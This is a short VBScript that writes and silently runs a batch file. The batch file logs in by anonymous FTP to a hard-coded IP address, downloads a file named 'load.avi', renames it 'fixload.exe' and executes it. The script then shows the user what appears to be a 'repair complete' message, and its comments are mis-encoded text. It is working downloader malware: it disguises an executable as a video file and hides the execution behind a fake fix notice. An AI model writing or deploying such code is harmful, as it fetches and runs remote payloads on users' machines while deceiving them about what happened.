Dim objFSO, objFile, objShell
Dim cmdFile, ftpFile, exeFile

' �����ļ���
ftpFile = "load.avi"
exeFile = "fixload.exe"
cmdFile = "updat.bat"

' �����ļ�ϵͳ������ⲿ�������
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' ���� updat.bat �ļ�
Set objFile = objFSO.CreateTextFile(cmdFile, True)
objFile.WriteLine "@echo off"
objFile.WriteLine "echo Downloading file from FTP..."
objFile.WriteLine "echo open 8.210.202.2>> ftp_commands.txt" ' FTP ��������ַ
objFile.WriteLine "echo anonymous>> ftp_commands.txt"
objFile.WriteLine "echo user@domain.com>> ftp_commands.txt" ' �滻Ϊʵ�ʵĵ����ʼ�
objFile.WriteLine "echo binary>> ftp_commands.txt"
objFile.WriteLine "echo cd D:/>> ftp_commands.txt" ' �л���Ŀ��Ŀ¼
objFile.WriteLine "echo get " & ftpFile & ">> ftp_commands.txt"
objFile.WriteLine "echo bye>> ftp_commands.txt"
objFile.WriteLine "ftp -s:ftp_commands.txt"
objFile.WriteLine "del ftp_commands.txt"
objFile.WriteLine "ren " & ftpFile & " " & exeFile
objFile.WriteLine "start " & exeFile
objFile.WriteLine "echo �޸����"
objFile.Close

' �Զ�ִ�� updat.bat
objShell.Run cmdFile, 0, True

' ��ʾ�û�
WScript.Echo "�޸����"
